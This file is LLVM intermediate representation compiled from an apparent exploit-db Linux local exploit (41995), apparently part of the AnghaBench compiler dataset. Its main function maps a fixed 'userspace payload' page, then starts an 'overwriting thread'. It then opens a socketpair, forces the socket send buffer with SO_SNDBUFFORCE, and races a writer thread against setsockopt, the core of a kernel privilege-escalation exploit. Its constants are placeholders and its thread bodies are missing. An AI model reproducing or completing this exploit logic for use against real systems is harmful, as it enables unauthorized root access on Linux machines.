; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_41995.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_41995.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@SHINFO = common dso_local global i32 0, align 4
@PROT_READ = common dso_local global i32 0, align 4
@PROT_WRITE = common dso_local global i32 0, align 4
@MAP_FIXED = common dso_local global i32 0, align 4
@MAP_ANONYMOUS = common dso_local global i32 0, align 4
@MAP_PRIVATE = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [7 x i8] c"mmap()\00", align 1
@EXIT_FAILURE = common dso_local global i32 0, align 4
@.str.1 = private unnamed_addr constant [37 x i8] c"[.] userspace payload mmapped at %p\0A\00", align 1
@skb_thr = common dso_local global i32 0, align 4
@.str.2 = private unnamed_addr constant [17 x i8] c"pthread_create()\00", align 1
@.str.3 = private unnamed_addr constant [32 x i8] c"[.] overwriting thread started\0A\00", align 1
@AF_LOCAL = common dso_local global i32 0, align 4
@SOCK_STREAM = common dso_local global i32 0, align 4
@sockets = common dso_local global i32* null, align 8
@.str.4 = private unnamed_addr constant [13 x i8] c"socketpair()\00", align 1
@.str.5 = private unnamed_addr constant [20 x i8] c"[.] sockets opened\0A\00", align 1
@SNDBUF = common dso_local global i32 0, align 4
@SOL_SOCKET = common dso_local global i32 0, align 4
@SO_SNDBUFFORCE = common dso_local global i32 0, align 4
@.str.6 = private unnamed_addr constant [13 x i8] c"setsockopt()\00", align 1
@.str.7 = private unnamed_addr constant [31 x i8] c"[.] sock->sk_sndbuf set to %x\0A\00", align 1
@write_thr = common dso_local global i32 0, align 4
@.str.8 = private unnamed_addr constant [23 x i8] c"[.] writing to socket\0A\00", align 1
@SO_SNDBUF = common dso_local global i32 0, align 4

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i8*, align 8
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  store i32 0, i32* %1, align 4
  %7 = load i32, i32* @SHINFO, align 4
  %8 = sext i32 %7 to i64
  %9 = and i64 %8, -4096
  %10 = inttoptr i64 %9 to i8*
  %11 = load i32, i32* @PROT_READ, align 4
  %12 = load i32, i32* @PROT_WRITE, align 4
  %13 = or i32 %11, %12
  %14 = load i32, i32* @MAP_FIXED, align 4
  %15 = load i32, i32* @MAP_ANONYMOUS, align 4
  %16 = or i32 %14, %15
  %17 = load i32, i32* @MAP_PRIVATE, align 4
  %18 = or i32 %16, %17
  %19 = call i8* @mmap(i8* %10, i32 4096, i32 %13, i32 %18, i32 -1, i32 0)
  store i8* %19, i8** %2, align 8
  %20 = load i8*, i8** %2, align 8
  %21 = load i32, i32* @SHINFO, align 4
  %22 = sext i32 %21 to i64
  %23 = and i64 %22, -4096
  %24 = inttoptr i64 %23 to i8*
  %25 = icmp ne i8* %20, %24
  br i1 %25, label %26, label %30

26:                                               ; preds = %0
  %27 = call i32 @perror(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str, i64 0, i64 0))
  %28 = load i32, i32* @EXIT_FAILURE, align 4
  %29 = call i32 @exit(i32 %28) #3
  unreachable

30:                                               ; preds = %0
  %31 = load i8*, i8** %2, align 8
  %32 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([37 x i8], [37 x i8]* @.str.1, i64 0, i64 0), i8* %31)
  %33 = load i32, i32* @skb_thr, align 4
  %34 = call i32 @pthread_create(i32* %5, i32 0, i32 %33, i32* null)
  store i32 %34, i32* %3, align 4
  %35 = load i32, i32* %3, align 4
  %36 = icmp ne i32 %35, 0
  br i1 %36, label %37, label %41

37:                                               ; preds = %30
  %38 = call i32 @perror(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.2, i64 0, i64 0))
  %39 = load i32, i32* @EXIT_FAILURE, align 4
  %40 = call i32 @exit(i32 %39) #3
  unreachable

41:                                               ; preds = %30
  %42 = call i32 @usleep(i32 10000)
  %43 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.3, i64 0, i64 0))
  %44 = load i32, i32* @AF_LOCAL, align 4
  %45 = load i32, i32* @SOCK_STREAM, align 4
  %46 = load i32*, i32** @sockets, align 8
  %47 = getelementptr inbounds i32, i32* %46, i64 0
  %48 = call i32 @socketpair(i32 %44, i32 %45, i32 0, i32* %47)
  store i32 %48, i32* %3, align 4
  %49 = load i32, i32* %3, align 4
  %50 = icmp ne i32 %49, 0
  br i1 %50, label %51, label %55

51:                                               ; preds = %41
  %52 = call i32 @perror(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.4, i64 0, i64 0))
  %53 = load i32, i32* @EXIT_FAILURE, align 4
  %54 = call i32 @exit(i32 %53) #3
  unreachable

55:                                               ; preds = %41
  %56 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.5, i64 0, i64 0))
  %57 = load i32, i32* @SNDBUF, align 4
  store i32 %57, i32* %4, align 4
  %58 = load i32*, i32** @sockets, align 8
  %59 = getelementptr inbounds i32, i32* %58, i64 1
  %60 = load i32, i32* %59, align 4
  %61 = load i32, i32* @SOL_SOCKET, align 4
  %62 = load i32, i32* @SO_SNDBUFFORCE, align 4
  %63 = call i32 @setsockopt(i32 %60, i32 %61, i32 %62, i32* %4, i32 4)
  store i32 %63, i32* %3, align 4
  %64 = load i32, i32* %3, align 4
  %65 = icmp ne i32 %64, 0
  br i1 %65, label %66, label %70

66:                                               ; preds = %55
  %67 = call i32 @perror(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.6, i64 0, i64 0))
  %68 = load i32, i32* @EXIT_FAILURE, align 4
  %69 = call i32 @exit(i32 %68) #3
  unreachable

70:                                               ; preds = %55
  %71 = load i32, i32* @SNDBUF, align 4
  %72 = mul nsw i32 %71, 2
  %73 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([31 x i8], [31 x i8]* @.str.7, i64 0, i64 0), i32 %72)
  %74 = load i32, i32* @write_thr, align 4
  %75 = call i32 @pthread_create(i32* %6, i32 0, i32 %74, i32* null)
  store i32 %75, i32* %3, align 4
  %76 = load i32, i32* %3, align 4
  %77 = icmp ne i32 %76, 0
  br i1 %77, label %78, label %82

78:                                               ; preds = %70
  %79 = call i32 @perror(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.2, i64 0, i64 0))
  %80 = load i32, i32* @EXIT_FAILURE, align 4
  %81 = call i32 @exit(i32 %80) #3
  unreachable

82:                                               ; preds = %70
  %83 = call i32 @usleep(i32 10000)
  %84 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.8, i64 0, i64 0))
  %85 = load i32*, i32** @sockets, align 8
  %86 = getelementptr inbounds i32, i32* %85, i64 1
  %87 = load i32, i32* %86, align 4
  %88 = load i32, i32* @SOL_SOCKET, align 4
  %89 = load i32, i32* @SO_SNDBUF, align 4
  %90 = call i32 @setsockopt(i32 %87, i32 %88, i32 %89, i32* %4, i32 4)
  store i32 %90, i32* %3, align 4
  %91 = load i32, i32* %3, align 4
  %92 = icmp ne i32 %91, 0
  br i1 %92, label %93, label %97

93:                                               ; preds = %82
  %94 = call i32 @perror(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.6, i64 0, i64 0))
  %95 = load i32, i32* @EXIT_FAILURE, align 4
  %96 = call i32 @exit(i32 %95) #3
  unreachable

97:                                               ; preds = %82
  %98 = call i32 @usleep(i32 10000)
  %99 = load i32*, i32** @sockets, align 8
  %100 = getelementptr inbounds i32, i32* %99, i64 0
  %101 = load i32, i32* %100, align 4
  %102 = call i32 @close(i32 %101)
  %103 = load i32*, i32** @sockets, align 8
  %104 = getelementptr inbounds i32, i32* %103, i64 1
  %105 = load i32, i32* %104, align 4
  %106 = call i32 @close(i32 %105)
  ret i32 0
}

declare dso_local i8* @mmap(i8*, i32, i32, i32, i32, i32) #1

declare dso_local i32 @perror(i8*) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i32 @printf(i8*, ...) #1

declare !callback !2 dso_local i32 @pthread_create(i32*, i32, i32, i32*) #1

declare dso_local i32 @usleep(i32) #1

declare dso_local i32 @socketpair(i32, i32, i32, i32*) #1

declare dso_local i32 @setsockopt(i32, i32, i32, i32*, i32) #1

declare dso_local i32 @close(i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
!2 = !{!3}
!3 = !{i64 2, i64 3, i1 false}
